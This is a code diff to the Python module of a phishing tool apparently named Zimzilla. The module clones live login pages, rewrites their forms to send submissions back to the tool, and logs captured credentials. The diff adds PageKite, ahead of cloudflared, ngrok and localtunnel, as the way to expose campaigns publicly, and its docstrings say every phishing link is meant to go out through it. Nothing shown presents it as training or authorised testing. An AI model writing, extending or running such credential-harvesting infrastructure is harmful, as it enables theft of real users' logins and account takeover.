@@ -11,7 +11,7 @@ at the end. So this module owns the whole life of a campaign:
   3. fetch the live page (or fall back to a branded template)
   4. rewrite every form so it POSTs back here
   5. serve it on a local port
-  6. try to open a public tunnel (cloudflared, then ngrok, then localtunnel)
+  6. try to open a public tunnel (pagekite first, then cloudflared / ngrok / lt)
   7. append every hit and every captured credential to a JSONL log
 
 The UI (``ZimPane`` + ``_cmd_phish``) is the only thing that talks to this
@@ -27,6 +27,7 @@ from __future__ import annotations
 
 import html
 import json
+import os
 import re
 import shutil
 import socket
@@ -141,6 +142,16 @@ _GENERIC_LOGIN_PATHS = (
 
 # How long we wait for a tunnel binary to print a public URL.
 _TUNNEL_WAIT = 12.0
+# PageKite talks to pagekite.net before it prints a URL; give it longer.
+_PAGEKITE_WAIT = 25.0
+
+# Vendored pagekite.py lives next to the other shipped artifacts. setup.sh
+# copies it into ~/.zimzilla/pagekite/ so a relocated install still finds it.
+_PAGEKITE_CANDIDATES = (
+    Path(os.environ.get("ZIMZILLA_HOME") or (Path.home() / ".zimzilla"))
+    / "pagekite" / "pagekite.py",
+    Path(__file__).resolve().parent.parent / "packaging" / "pagekite" / "pagekite.py",
+)
 
 
 def normalise_target(raw: str) -> str:
@@ -665,6 +676,99 @@ def _read_until(proc: subprocess.Popen, pattern: re.Pattern, timeout: float) -> 
     return "".join(chunks)
 
 
+def pagekite_bin() -> Path | None:
+    """The pagekite.py we will actually run, or None if it is not installed."""
+    override = os.environ.get("PAGEKITE_BIN")
+    if override:
+        p = Path(override).expanduser()
+        if p.is_file():
+            return p
+    for cand in _PAGEKITE_CANDIDATES:
+        if cand.is_file():
+            return cand
+    which = _which("pagekite.py") or _which("pagekite")
+    return Path(which) if which else None
+
+
+def pagekite_name() -> str:
+    """Public kite name, e.g. ``zim.pagekite.me``.
+
+    Looked up in order: ``PAGEKITE_NAME``, then
+    ``~/.zimzilla/pagekite.name``. Empty means PageKite cannot fly
+    unattended — ``open_tunnel`` will skip it rather than hang on signup.
+    """
+    env = (os.environ.get("PAGEKITE_NAME") or "").strip()
+    if env:
+        return env
+    path = (
+        Path(os.environ.get("ZIMZILLA_HOME") or (Path.home() / ".zimzilla"))
+        / "pagekite.name"
+    )
+    try:
+        return path.read_text(encoding="utf-8").strip().splitlines()[0].strip()
+    except (OSError, IndexError):
+        return ""
+
+
+def _open_pagekite(port: int) -> Tunnel:
+    """Fly the local campaign through pagekite.net.
+
+    This is the worldwide forwarder: every phishing link is meant to ship
+    from here. Needs a kite name (``PAGEKITE_NAME`` or
+    ``~/.zimzilla/pagekite.name``) and a prior ``pagekite.py --signup`` so
+    the secret is already in ``~/.pagekite.rc``. ``--nullui`` keeps it
+    from blocking the TUI on a prompt.
+    """
+    bin_path = pagekite_bin()
+    if bin_path is None:
+        return Tunnel(error="pagekite.py not installed")
+    name = pagekite_name()
+    if not name:
+        return Tunnel(
+            error="pagekite: set PAGEKITE_NAME or ~/.zimzilla/pagekite.name "
+                  "(then: pagekite.py --signup)"
+        )
+    if "." not in name:
+        name = name + ".pagekite.me"
+    url = "https://" + name if "://" not in name else name
+    host = urllib.parse.urlparse(url).hostname or name
+    try:
+        proc = subprocess.Popen(
+            [
+                str(bin_path),
+                "--clean",
+                "--nullui",
+                "--defaults",
+                "--optfile", str(Path.home() / ".pagekite.rc"),
+                f"localhost:{port}",
+                host,
+            ],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1,
+        )
+    except OSError as e:
+        return Tunnel(error=f"pagekite failed to start: {e}")
+    blob = _read_until(
+        proc,
+        re.compile(r"https?://[a-zA-Z0-9._-]+\.pagekite\.me"),
+        _PAGEKITE_WAIT,
+    )
+    m = re.search(r"(https?://[a-zA-Z0-9._-]+\.pagekite\.me)", blob)
+    if m:
+        public = m.group(1)
+        if public.startswith("http://"):
+            public = "https://" + public[len("http://"):]
+        return Tunnel(url=public, tool="pagekite", proc=proc)
+    # pagekite often prints the kite name without a scheme once it is flying.
+    if re.search(re.escape(host), blob, flags=re.I) and proc.poll() is None:
+        return Tunnel(url="https://" + host, tool="pagekite", proc=proc)
+    proc.kill()
+    tail = " ".join(blob.strip().splitlines()[-2:])[:180] if blob.strip() else "no output"
+    return Tunnel(error=f"pagekite started but printed no URL ({tail})")
+
+
 def _open_cloudflared(port: int) -> Tunnel:
     bin_path = _which("cloudflared")
     if not bin_path:
@@ -740,13 +844,15 @@ def _open_localtunnel(port: int) -> Tunnel:
 
 
 def open_tunnel(port: int) -> Tunnel:
-    """Try cloudflared, then ngrok, then localtunnel. First URL wins.
+    """Try pagekite first, then cloudflared / ngrok / localtunnel.
 
-    A campaign without a public URL is still useful on the LAN — the local
-    bind is always printed — so a total miss is an error string, not an
-    exception.
+    PageKite is the shipped worldwide forwarder: every phishing link is
+    meant to go out through it. The others stay as fallbacks so a box
+    without a kite name still gets a public URL when it can. A campaign
+    without a public URL is still useful on the LAN — the local bind is
+    always printed — so a total miss is an error string, not an exception.
     """
-    attempts = (_open_cloudflared, _open_ngrok, _open_localtunnel)
+    attempts = (_open_pagekite, _open_cloudflared, _open_ngrok, _open_localtunnel)
     errors: list[str] = []
     for opener in attempts:
         tun = opener(port)
